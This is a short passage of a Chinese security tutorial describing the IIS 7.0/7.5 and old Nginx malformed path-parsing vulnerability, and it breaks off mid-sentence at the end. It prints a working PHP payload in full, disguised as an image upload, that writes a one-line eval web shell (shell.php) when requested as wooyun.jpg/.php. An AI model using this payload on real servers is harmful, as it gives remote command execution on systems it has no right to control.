二、IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞

---

Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…

在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为

<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>


的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php

这个漏洞案例